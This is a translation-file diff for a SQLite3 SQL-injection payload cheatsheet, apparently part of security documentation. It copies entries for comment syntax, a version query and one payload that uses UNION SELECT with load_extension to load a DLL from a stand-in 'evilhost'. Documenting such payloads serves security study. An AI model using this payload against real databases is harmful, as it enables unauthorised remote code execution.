@@ -20,36 +20,36 @@ msgstr ""
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:2
 msgid "SQLite3 Payload"
-msgstr ""
+msgstr "SQLite3 Payload"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:4
 msgid "Comment"
-msgstr ""
+msgstr "Comment"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:5
 msgid "``--``"
-msgstr ""
+msgstr "``--``"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:6
 msgid "``/**/``"
-msgstr ""
+msgstr "``/**/``"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:7
 msgid "Version"
-msgstr ""
+msgstr "Version"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:8
 msgid "``select sqlite_version();``"
-msgstr ""
+msgstr "``select sqlite_version();``"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:11
 msgid "Command Execution"
-msgstr ""
+msgstr "Command Execution"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:20
 msgid "Load_extension"
-msgstr ""
+msgstr "Load_extension"
 
 #: ../../source/vuln/sql/cheatsheet/sqlite3.rst:22
 msgid "``UNION SELECT 1,load_extension('\\\\evilhost\\evil.dll','E');--``"
-msgstr ""
+msgstr "``UNION SELECT 1,load_extension('\\\\evilhost\\evil.dll','E');--``"
